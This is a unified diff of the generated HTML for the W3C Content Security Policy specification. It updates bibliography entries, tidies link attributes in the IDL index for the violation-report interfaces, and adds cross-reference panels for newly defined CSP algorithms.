   <h3 class="no-num no-ref heading settled" id="normative"><span class="content">Normative References</span><a class="self-link" href="#normative"></a></h3>
   <dl>
-   <dt id="biblio-css-cascade-4">[CSS-CASCADE-4]
-   <dd>Elika Etemad; Tab Atkins Jr.. <a href="https://www.w3.org/TR/css-cascade-4/">CSS Cascading and Inheritance Level 4</a>. 28 August 2018. CR. URL: <a href="https://www.w3.org/TR/css-cascade-4/">https://www.w3.org/TR/css-cascade-4/</a>
+   <dt id="biblio-css-cascade-5">[CSS-CASCADE-5]
+   <dd>CSS Cascading and Inheritance Level 5 URL: <a href="https://www.w3.org/TR/css-cascade-5/">https://www.w3.org/TR/css-cascade-5/</a>
    <dt id="biblio-cssom">[CSSOM]
    <dd>Simon Pieters; Glenn Adams. <a href="https://www.w3.org/TR/cssom-1/">CSS Object Model (CSSOM)</a>. 17 March 2016. WD. URL: <a href="https://www.w3.org/TR/cssom-1/">https://www.w3.org/TR/cssom-1/</a>
    <dt id="biblio-dom">[DOM]
@@ -8218,12 +8609,12 @@ rest of Google’s CSP Cabal.</p>
    <dt id="biblio-webidl">[WebIDL]
    <dd>Boris Zbarsky. <a href="https://heycam.github.io/webidl/">Web IDL</a>. 15 December 2016. ED. URL: <a href="https://heycam.github.io/webidl/">https://heycam.github.io/webidl/</a>
    <dt id="biblio-worklets-1">[WORKLETS-1]
-   <dd>Ian Kilpatrick. <a href="https://www.w3.org/TR/worklets-1/">Worklets Level 1</a>. 7 June 2016. WD. URL: <a href="https://www.w3.org/TR/worklets-1/">https://www.w3.org/TR/worklets-1/</a>
+   <dd>Ian Kilpatrick. <a href="https://www.w3.org/TR/worklets-1/">Worklets Level 1</a>. 8 September 2020. WD. URL: <a href="https://www.w3.org/TR/worklets-1/">https://www.w3.org/TR/worklets-1/</a>
   </dl>
   <h3 class="no-num no-ref heading settled" id="informative"><span class="content">Informative References</span><a class="self-link" href="#informative"></a></h3>
   <dl>
    <dt id="biblio-appmanifest">[APPMANIFEST]
-   <dd>Marcos Caceres; et al. <a href="https://www.w3.org/TR/appmanifest/">Web App Manifest</a>. 25 May 2020. WD. URL: <a href="https://www.w3.org/TR/appmanifest/">https://www.w3.org/TR/appmanifest/</a>
+   <dd>Marcos Caceres; et al. <a href="https://www.w3.org/TR/appmanifest/">Web App Manifest</a>. 19 October 2020. WD. URL: <a href="https://www.w3.org/TR/appmanifest/">https://www.w3.org/TR/appmanifest/</a>
    <dt id="biblio-beacon">[BEACON]
    <dd>Ilya Grigorik; et al. <a href="https://www.w3.org/TR/beacon/">Beacon</a>. 13 April 2017. CR. URL: <a href="https://www.w3.org/TR/beacon/">https://www.w3.org/TR/beacon/</a>
    <dt id="biblio-csp2">[CSP2]
@@ -8255,7 +8646,7 @@ rest of Google’s CSP Cabal.</p>
   </dl>
   <h2 class="no-num no-ref heading settled" id="idl-index"><span class="content">IDL Index</span><a class="self-link" href="#idl-index"></a></h2>
 <pre class="idl highlight def">[<a class="idl-code" data-link-type="extended-attribute" href="https://heycam.github.io/webidl/#Exposed"><c- g>Exposed</c-></a>=<c- n>Window</c->]
-<c- b>interface</c-> <a href="#cspviolationreportbody"><code><c- g>CSPViolationReportBody</c-></code></a> : <a class="n" data-link-type="idl-name" href="https://w3c.github.io/reporting/#reportbody"><c- n>ReportBody</c-></a> {
+<c- b>interface</c-> <a href="#cspviolationreportbody"><code><c- g>CSPViolationReportBody</c-></code></a> : <a data-link-type="idl-name" href="https://w3c.github.io/reporting/#reportbody"><c- n>ReportBody</c-></a> {
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a> <a data-readonly data-type="USVString" href="#dom-cspviolationreportbody-documenturl"><code><c- g>documentURL</c-></code></a>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-referrer"><code><c- g>referrer</c-></code></a>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-blockedurl"><code><c- g>blockedURL</c-></code></a>;
@@ -8263,7 +8654,7 @@ rest of Google’s CSP Cabal.</p>
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString"><c- b>DOMString</c-></a> <a data-readonly data-type="DOMString" href="#dom-cspviolationreportbody-originalpolicy"><code><c- g>originalPolicy</c-></code></a>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>? <a data-readonly data-type="USVString?" href="#dom-cspviolationreportbody-sourcefile"><code><c- g>sourceFile</c-></code></a>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString"><c- b>DOMString</c-></a>? <a data-readonly data-type="DOMString?" href="#dom-cspviolationreportbody-sample"><code><c- g>sample</c-></code></a>;
-  <c- b>readonly</c-> <c- b>attribute</c-> <a class="n" data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <a data-readonly data-type="SecurityPolicyViolationEventDisposition" href="#dom-cspviolationreportbody-disposition"><code><c- g>disposition</c-></code></a>;
+  <c- b>readonly</c-> <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <a data-readonly data-type="SecurityPolicyViolationEventDisposition" href="#dom-cspviolationreportbody-disposition"><code><c- g>disposition</c-></code></a>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-readonly data-type="unsigned short" href="#dom-cspviolationreportbody-statuscode"><code><c- g>statusCode</c-></code></a>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <a data-readonly data-type="unsigned long?" href="#dom-cspviolationreportbody-linenumber"><code><c- g>lineNumber</c-></code></a>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <a data-readonly data-type="unsigned long?" href="#dom-cspviolationreportbody-columnnumber"><code><c- g>columnNumber</c-></code></a>;
@@ -8274,8 +8665,8 @@ rest of Google’s CSP Cabal.</p>
 };
 
 [<a class="idl-code" data-link-type="extended-attribute" href="https://heycam.github.io/webidl/#Exposed"><c- g>Exposed</c-></a>=(<c- n>Window</c->,<c- n>Worker</c->)]
-<c- b>interface</c-> <a href="#securitypolicyviolationevent"><code><c- g>SecurityPolicyViolationEvent</c-></code></a> : <a class="n" data-link-type="idl-name" href="https://dom.spec.whatwg.org/#event"><c- n>Event</c-></a> {
-    <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent"><code><c- g>constructor</c-></code></a>(<a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString"><c- b>DOMString</c-></a> <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"><code><c- g>type</c-></code></a>, <c- b>optional</c-> <a class="n" data-link-type="idl-name" href="#dictdef-securitypolicyviolationeventinit"><c- n>SecurityPolicyViolationEventInit</c-></a> <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"><code><c- g>eventInitDict</c-></code></a> = {});
+<c- b>interface</c-> <a href="#securitypolicyviolationevent"><code><c- g>SecurityPolicyViolationEvent</c-></code></a> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#event"><c- n>Event</c-></a> {
+    <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent"><code><c- g>constructor</c-></code></a>(<a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString"><c- b>DOMString</c-></a> <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"><code><c- g>type</c-></code></a>, <c- b>optional</c-> <a data-link-type="idl-name" href="#dictdef-securitypolicyviolationeventinit"><c- n>SecurityPolicyViolationEventInit</c-></a> <a href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"><code><c- g>eventInitDict</c-></code></a> = {});
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-documenturl"><code><c- g>documentURL</c-></code></a>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>      <a class="idl-code" data-link-type="attribute" data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-documenturi"><c- g>documentURI</c-></a>; // historical alias of documentURL
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-referrer"><code><c- g>referrer</c-></code></a>;
@@ -8286,7 +8677,7 @@ rest of Google’s CSP Cabal.</p>
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-originalpolicy"><code><c- g>originalPolicy</c-></code></a>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-sourcefile"><code><c- g>sourceFile</c-></code></a>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-sample"><code><c- g>sample</c-></code></a>;
-    <c- b>readonly</c->    <c- b>attribute</c-> <a class="n" data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a>      <a data-readonly data-type="SecurityPolicyViolationEventDisposition" href="#dom-securitypolicyviolationevent-disposition"><code><c- g>disposition</c-></code></a>;
+    <c- b>readonly</c->    <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a>      <a data-readonly data-type="SecurityPolicyViolationEventDisposition" href="#dom-securitypolicyviolationevent-disposition"><code><c- g>disposition</c-></code></a>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-readonly data-type="unsigned short" href="#dom-securitypolicyviolationevent-statuscode"><code><c- g>statusCode</c-></code></a>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-lineno"><code><c- g>lineno</c-></code></a>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a class="idl-code" data-link-type="attribute" data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-linenumber"><c- g>lineNumber</c-></a>; // historical alias of lineno
@@ -8294,7 +8685,7 @@ rest of Google’s CSP Cabal.</p>
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a class="idl-code" data-link-type="attribute" data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-columnnumber"><c- g>columnNumber</c-></a>; // historical alias of colno
 };
 
-<c- b>dictionary</c-> <a href="#dictdef-securitypolicyviolationeventinit"><code><c- g>SecurityPolicyViolationEventInit</c-></code></a> : <a class="n" data-link-type="idl-name" href="https://dom.spec.whatwg.org/#dictdef-eventinit"><c- n>EventInit</c-></a> {
+<c- b>dictionary</c-> <a href="#dictdef-securitypolicyviolationeventinit"><code><c- g>SecurityPolicyViolationEventInit</c-></code></a> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#dictdef-eventinit"><c- n>EventInit</c-></a> {
     <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>      <a data-type="USVString      " href="#dom-securitypolicyviolationeventinit-documenturl"><code><c- g>documentURL</c-></code></a>;
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString      " href="#dom-securitypolicyviolationeventinit-referrer"><code><c- g>referrer</c-></code></a> = "";
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString      " href="#dom-securitypolicyviolationeventinit-blockedurl"><code><c- g>blockedURL</c-></code></a> = "";
@@ -8302,7 +8693,7 @@ rest of Google’s CSP Cabal.</p>
     <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-type="DOMString      " href="#dom-securitypolicyviolationeventinit-originalpolicy"><code><c- g>originalPolicy</c-></code></a>;
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString      " href="#dom-securitypolicyviolationeventinit-sourcefile"><code><c- g>sourceFile</c-></code></a> = "";
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-default="&quot;&quot;" data-type="DOMString      " href="#dom-securitypolicyviolationeventinit-sample"><code><c- g>sample</c-></code></a> = "";
-    <c- b>required</c-> <a class="n" data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <a data-type="SecurityPolicyViolationEventDisposition " href="#dom-securitypolicyviolationeventinit-disposition"><code><c- g>disposition</c-></code></a>;
+    <c- b>required</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <a data-type="SecurityPolicyViolationEventDisposition " href="#dom-securitypolicyviolationeventinit-disposition"><code><c- g>disposition</c-></code></a>;
     <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-type="unsigned short " href="#dom-securitypolicyviolationeventinit-statuscode"><code><c- g>statusCode</c-></code></a>;
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-default="0" data-type="unsigned long  " href="#dom-securitypolicyviolationeventinit-lineno"><code><c- g>lineno</c-></code></a> = 0;
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-default="0" data-type="unsigned long  " href="#dom-securitypolicyviolationeventinit-colno"><code><c- g>colno</c-></code></a> = 0;
@@ -9600,6 +9991,72 @@ rest of Google’s CSP Cabal.</p>
     Initialize a global object’s CSP list </a>
    </ul>
   </aside>
+  <aside class="dfn-panel" data-for="initialize-document-csp">
+   <b><a href="#initialize-document-csp">#initialize-document-csp</a></b><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-initialize-document-csp">2.2. Policies</a> <a href="#ref-for-initialize-document-csp">(2)</a>
+    <li><a href="#ref-for-initialize-document-csp">2.3. Directives</a>
+    <li><a href="#ref-for-initialize-document-csp">4.2. 
+    Integration with HTML </a> <a href="#ref-for-initialize-document-csp">(2)</a>
+    <li><a href="#ref-for-initialize-document-csp">4.2.1. 
+    Initialize a Document's CSP list </a>
+    <li><a href="#ref-for-initialize-document-csp">7.8. 
+    CSP Inheriting to avoid bypasses </a>
+   </ul>
+  </aside>
+  <aside class="dfn-panel" data-for="initialize-global-object-csp">
+   <b><a href="#initialize-global-object-csp">#initialize-global-object-csp</a></b><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-initialize-global-object-csp">2.2. Policies</a>
+    <li><a href="#ref-for-initialize-global-object-csp">4.2. 
+    Integration with HTML </a> <a href="#ref-for-initialize-global-object-csp">(2)</a>
+    <li><a href="#ref-for-initialize-global-object-csp">4.2.2. 
+    Initialize a global object’s CSP list </a>
+    <li><a href="#ref-for-initialize-global-object-csp">7.8. 
+    CSP Inheriting to avoid bypasses </a>
+   </ul>
+  </aside>
+  <aside class="dfn-panel" data-for="should-block-inline">
+   <b><a href="#should-block-inline">#should-block-inline</a></b><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-should-block-inline">2.3. Directives</a>
+    <li><a href="#ref-for-should-block-inline">4.2. 
+    Integration with HTML </a> <a href="#ref-for-should-block-inline">(2)</a>
+    <li><a href="#ref-for-should-block-inline">4.2.4. 
+    Should element’s inline type behavior be blocked by Content Security Policy? </a>
+    <li><a href="#ref-for-should-block-inline">6.1.11. script-src</a>
+    <li><a href="#ref-for-should-block-inline">6.1.14. style-src</a>
+   </ul>
+  </aside>
+  <aside class="dfn-panel" data-for="should-block-navigation-request">
+   <b><a href="#should-block-navigation-request">#should-block-navigation-request</a></b><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-should-block-navigation-request">2.3. Directives</a> <a href="#ref-for-should-block-navigation-request">(2)</a>
+    <li><a href="#ref-for-should-block-navigation-request">4.2. 
+    Integration with HTML </a>
+    <li><a href="#ref-for-should-block-navigation-request">4.2.5. 
+    Should navigation request of type be blocked
+    by Content Security Policy? </a>
+   </ul>
+  </aside>
+  <aside class="dfn-panel" data-for="should-block-navigation-response">
+   <b><a href="#should-block-navigation-response">#should-block-navigation-response</a></b><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-should-block-navigation-response">2.3. Directives</a>
+    <li><a href="#ref-for-should-block-navigation-response">4.2. 
+    Integration with HTML </a>
+    <li><a href="#ref-for-should-block-navigation-response">4.2.6. 
+    Should navigation response to navigation request of type
+    in target be blocked by Content Security Policy? </a>
+   </ul>
+  </aside>
+  <aside class="dfn-panel" data-for="can-compile-strings">
+   <b><a href="#can-compile-strings">#can-compile-strings</a></b><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-can-compile-strings">4.3.1. 
+    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source) </a>
+   </ul>
+  </aside>
   <aside class="dfn-panel" data-for="csp-violation-report">
    <b><a href="#csp-violation-report">#csp-violation-report</a></b><b>Referenced in:</b>
    <ul>
@@ -10025,6 +10482,15 @@ rest of Google’s CSP Cabal.</p>
     Directive Registry </a>
    </ul>
   </aside>
+  <aside class="dfn-panel" data-for="allow-base-for-document">
+   <b><a href="#allow-base-for-document">#allow-base-for-document</a></b><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-allow-base-for-document">4.2. 
+    Integration with HTML </a>
+    <li><a href="#ref-for-allow-base-for-document">6.2.1.1. 
+    Is base allowed for document? </a>
+   </ul>
+  </aside>
   <aside class="dfn-panel" data-for="plugin-types">
    <b><a href="#plugin-types">#plugin-types</a></b><b>Referenced in:</b>
    <ul>
@@ -10045,11 +10511,21 @@ rest of Google’s CSP Cabal.</p>
     <li><a href="#ref-for-grammardef-media-type">6.2.2. plugin-types</a> <a href="#ref-for-grammardef-media-type①">(2)</a>
    </ul>
   </aside>
+  <aside class="dfn-panel" data-for="plugin-types-post-request-check">
+   <b><a href="#plugin-types-post-request-check">#plugin-types-post-request-check</a></b><b>Referenced in:</b>
+   <ul>
+    <li><a href="#ref-for-plugin-types-post-request-check">6.2.2.1. 
+    plugin-types Post-Request Check </a>
+   </ul>
+  </aside>
   <aside class="dfn-panel" data-for="should-plugin-element-be-blocked-a-priori-by-content-security-policy">
    <b><a href="#should-plugin-element-be-blocked-a-priori-by-content-security-policy">#should-plugin-element-be-blocked-a-priori-by-content-security-policy</a></b><b>Referenced in:</b>
    <ul>
     <li><a href="#ref-for-should-plugin-element-be-blocked-a-priori-by-content-security-policy">4.2. 
     Integration with HTML </a>
+    <li><a href="#ref-for-should-plugin-element-be-blocked-a-priori-by-content-security-policy">6.2.2.2. 
+    Should plugin element be blocked a priori by Content
+    Security Policy?: </a>
    </ul>
   </aside>
   <aside class="dfn-panel" data-for="sandbox">
